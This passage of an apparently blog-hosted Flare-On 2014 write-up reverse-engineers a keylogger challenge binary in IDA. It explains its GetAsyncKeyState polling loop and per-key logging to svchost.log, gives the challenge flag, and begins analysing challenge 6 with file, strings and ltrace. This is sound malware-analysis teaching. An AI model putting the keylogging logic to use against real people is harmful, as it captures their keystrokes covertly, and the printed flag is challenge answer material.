<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A4D3</span> <span class="nv">call</span>    <span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">rand</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4D8</span> <span class="nv">cdq</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4D9</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0C8h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4DE</span> <span class="nv">idiv</span>    <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E0</span> <span class="nv">add</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">32h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E3</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10</span><span class="p">],</span> <span class="nb">edx</span>    <span class="c1">; var&lt;em&gt;10 = size of array of type size_t</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E6</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E9</span> <span class="nv">imul</span>    <span class="nb">edx</span><span class="p">,</span> <span class="mh">0Fh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4EC</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; size_t</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4ED</span> <span class="nv">call</span>    <span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">malloc</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4F2</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4F5</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">],</span> <span class="nb">eax</span> <span class="c1">; pointer to allocated memory</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4F8</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10</span><span class="p">]</span>    <span class="c1">; eax = size of array</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4FB</span> <span class="nv">imul</span>    <span class="nb">eax</span><span class="p">,</span> <span class="mh">0Fh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4FE</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; size_t</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4FF</span> <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; int</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A501</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A504</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; void *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A505</span> <span class="nv">call</span>    <span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">memset</span>         <span class="c1">; Initialize array with 0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A50A</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A50D</span> <span class="nv">push</span>    <span class="mh">0Ah</span>             <span class="c1">; dwMilliseconds</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A50F</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">Sleep</span>        <span class="c1">; Sleep for 10 miliseconds</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A515</span> <span class="nv">xor</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; edx = 0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A517</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">8</span><span class="p">],</span> <span class="nb">dx</span> <span class="c1">; var_8 = 0&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A51B</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A51B</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A51B</span> <span class="nv">movsx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">8</span><span class="p">]</span>   <span class="c1">; eax = 0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A51F</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10</span><span class="p">]</span>  <span class="c1">; if (0 =&amp;gt; size of array) </span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A522</span> <span class="nv">jge</span>     <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A554</span> <span class="c1">; if (no memory was allocated) - jump to loc_1000A554&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="c1">; if memory was allocated</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A524</span> <span class="nv">push</span>    <span class="mh">0Ah</span>             <span class="c1">; dwMilliseconds</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A526</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">Sleep</span>        <span class="c1">; Sleep for 10 miliseconds</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A52C</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10009</span><span class="nv">EB0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A531</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">14</span><span class="p">],</span> <span class="nb">eax</span>    <span class="c1">; var&lt;em&gt;14 = sub&lt;/em&gt;10009EB0()</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A534</span> <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">14</span><span class="p">],</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A538</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A55</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Line 1 calls <code>rand</code> and the result is modified a few times by doing some calculations in lines 3-8. In line 9, it is pushed to stack as argument for <code>malloc</code>. So a random number of bytes are allocated. Seems like it is allocating an array of type <code>size_t</code>. This is reinforced because the number is multiplied by 16 (size of size_t) in line 8 before being pushed to the stack. After the <code>malloc</code>, the pointer to the allocated memory is stored in <code>var_C</code>. In lines 13-19 we see that this array is reset to zero by <code>memset</code>. Line 22 calls sleep with 10 miliseconds. Last line compares the calculated size of array with 0 and if so then no memory was allocated and program jumps back to the start of the function and tries to allocate memory and initialize memory again. If memory was allocated we continue to line 32 sleep for 10 miliseconds and call <code>sub_10009EB0</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>sub_10009EB0 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">10009</span><span class="nv">EB0</span> <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10009</span><span class="nv">EB0</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span> <span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">8</span><span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span> <span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="err">=</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span> <span class="nv">push</span>    <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB1</span> <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB3</span> <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB6</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EBB</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ax</span>   <span class="c1">; var&lt;em&gt;4 = 0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EBF</span> <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10009</span><span class="nv">ECD</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">10009</span><span class="nv">ECD</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10009</span><span class="nv">ECD</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">ECD</span> <span class="nv">movsx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">ED1</span> <span class="nv">cmp</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">0DEh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">ED7</span> <span class="nv">jg</span>      <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A3A4</span> <span class="c1">; if var&lt;/em&gt;4 &amp;gt; 222 (0xDE) jump to loc_1000A3A4&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">10009</span><span class="nv">EDD</span> <span class="nv">movsx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EE1</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; vKey</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EE2</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetAsyncKeyState</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EE8</span> <span class="nv">movsx</span>   <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EEB</span> <span class="nv">cmp</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0FFFF8001h</span> <span class="c1">; check if vKey was pressed</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EF1</span> <span class="nv">jnz</span>     <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A39F</span>    <span class="c1">; jumptable 1000A2D4 default case&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A39F</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A39F</span><span class="p">:</span>           <span class="c1">; jumptable 1000A2D4 default case</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A39F</span> <span class="nv">jmp</span>     <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10009</span><span class="nv">EC1</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">10009</span><span class="nv">EC1</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10009</span><span class="nv">EC1</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EC1</span> <span class="nv">mov</span>     <span class="nb">cx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EC5</span> <span class="nv">add</span>     <span class="nb">cx</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EC9</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">],</span> <span class="nb">cx</span> <span class="c1">; (var&lt;/em&gt;4)++</span>
</span><span class='line'><span class="c1">; go back to line 14&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This is what we are looking for. First <code>var_4</code> is set to 0 in line 10, then it is compared with 222 in lines 15-16 . If it is larger, we jump to <code>loc_1000A3A4</code>.</p>

<p>If not we will reach line 18 where <code>var_4</code> (initially 0) is stored in eax and pushed to stack as parameter for <code>GetAsyncKeyState</code>. We already know what this function does. If <code>vKey</code> has been pressed since last call to <code>GetAsyncKeyState</code>, it will return a value. Otherwise it will return 0. This <a href="http://reversing.be/forum/viewtopic.php?t=628&amp;sid=bf0d5e83ef43f1c34c41cd5cd2793a76">forum thread from 2007</a> discusses this usecase.<br />
If the key was not pressed, we jump to line 26 and then 29 where <code>var_4</code> is increased by 1. Then we go back to line 14 where <code>var_4</code> is compared with 222 and the cycle is repeated.</p>

<p>Now we know that the application loops through ascii characters from 0 to 222 checking to see if a key was pressed. If so we will not jump at line 23 and continue. Let’s take a look at that.</p>

<p><img src="/images/2014/flare/5-5.jpg" alt="Key pressed" title="Key pressed" /></p>

<p>This code is a series of cases for a switch statement (as IDA has detected). It checks what key was pressed performs specific actions for each key (taking the red arrows). It checks from <code>0x27</code> to <code>0x60</code>. By looking at an ASCII table, we can see that the application checks for some special characters, number and letters. I am not going to describe what each one does but I went through each function and looked at the code. Most of them were the same and looked uninteresting but the function for <code>M</code> or <code>0x4D</code> caught my eye. Finding the code for <code>M</code> and clicking on the red arrow besides it.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>If M is pressed </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1B6</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A1B6</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1B6</span> <span class="nv">movsx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1BA</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">4Dh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1BD</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_1000A1C9</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A1BF</span> <span class="nv">call</span>    <span class="nv">sub_10009AF0</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>What is <code>sub_10009AF0</code>?</p>

<p><img src="/images/2014/flare/5-6.jpg" alt="sub10009Af0" title="sub10009AF0" /></p>

<p>Nice, IDA has even tagged it as M for us. First we see that a <code>dword_10017000</code> is compared to 0. and if it is larger than 0, two functions are called: <code>__cfltcvt_init</code> and <code>sub_10001240</code>. Then returns with value <code>m</code>.</p>

<p><img src="/images/2014/flare/5-7.jpg" alt="__cfltcvt_init" title="__cfltcvt_init" /></p>

<p><code>__cfltcvt_init</code> sets one variable to 1 and resets the rest (including <code>dword_10017000</code>).</p>

<p><code>sub_10001240</code> creates a large array, initializes it with some values and then calles <code>GetWindowLong</code> and <code>DialogBoxIndirectParam</code>. I put a breakpoint in the end. Change the IP to the start of this function and ran the program.</p>

<p><img src="/images/2014/flare/5-8.jpg" alt="ASCII Flare" title="ASCII Flare" /></p>

<p>Nice! So to get this ASCII art we have to press M and <code>dword_10017000</code> needs to be 0. Let’s get back to <code>sub_10009AF0</code> and investigate <code>dword_10017000</code>.</p>

<p>Highlight <code>dword_10017000</code> and press <code>x</code> in IDA to see where this variable is being set to 1 (which will make the if true). There is only one place.</p>

<p><img src="/images/2014/flare/5-9.jpg" alt="Where M is set" title="Where M is set" /></p>

<p>Notice the <code>o</code>? Now see that variable <code>dword_100194F8</code> needs to be 1 to reach this line (top right). Follow that using <code>x</code>.</p>

<p>So we have <code>m</code> and then <code>o</code>. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes to <code>svchost.log</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Flag 5 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>l0gging.Ur.5tr0ke5@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<hr />

<h2 id="a-namech6a-challenge-6---ida-appreciation-day"><a name="ch6"></a> Challenge 6 - IDA Appreciation Day</h2>

<p><code>
Great success!
We've got another evil one for you, see if you can figure this out. This one will be rougher. Good luck!
-FLARE
</code></p>

<p>While I was writing this solution, I saw this alternative way of solving the challenge. Great read: <a href="http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html">Solving FireEye’s Flare On Six via Side Channels</a>.</p>

<p>New binary. Named <code>e7bc5d2c0cf4480348f5504196561297</code>. Let’s google it and <a href="http://pedump.me/e7bc5d2c0cf4480348f5504196561297/">first result</a> is interesting. Filename has the <code>exe</code> extension but it is a 64-bit ELF executable. Opening the file in <code>HxD</code> shows us the ELF magic bytes.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Info from pedumpme </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>filename  spyEye1.4.exe
</span><span class='line'>size      1221064 <span class="o">(</span>0x12a1c8<span class="o">)</span>
</span><span class='line'>md5       e7bc5d2c0cf4480348f5504196561297
</span><span class='line'><span class="nb">type      </span>ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for </span>GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM. </p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Running commands </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># the same as the website</span>
</span><span class='line'><span class="nv">$ </span>file e7bc5d2c0cf4480348f5504196561297
</span><span class='line'>e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for </span>GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>strings e7bc5d2c0cf4480348f5504196561297
</span><span class='line'><span class="c"># results in a bunch of random strings</span>
</span><span class='line'><span class="c"># looks like a mix of error messages, source code and random words</span>
</span><span class='line'>/index.html
</span><span class='line'>Nosebleed   <span class="c"># Heartbleed eh? :)</span>
</span><span class='line'>../nptl/sysdeps/unix/sysv/linux/x86_64/../fork.c
</span><span class='line'>info<span class="o">[</span>20<span class="o">]</span>-&amp;gt;d_un.d_val <span class="o">==</span> 7
</span><span class='line'>…&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;lets-see-shared-library-calls---nope&quot;</span>&gt;let’s see shared library calls - nope&lt;/h1&gt;
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>ltrace ./e7bc5d2c0cf4480348f5504196561297
</span><span class='line'>ltrace: Couldn’t find .dynsym or .dynstr in “./e7bc5d2c0cf4480348f5504196561297”&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;lets-run-the-binary-manually&quot;</span>&gt;Let’s run the binary manually&lt;/h1&gt;
</span><span class='line'>&lt;p&gt;# running it normally
</span><span class='line'><span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297
</span><span class='line'>no&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;one-argument---different-message&quot;</span>&gt;one argument - different message&lt;/h1&gt;
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg1
</span><span class='line'>na&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;longer-argument---message-did-not-change&quot;</span>&gt;longer argument - message did not change&lt;/h1&gt;
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111
</span><span class='line'>na&lt;/p&gt;
</span><span class='line'>
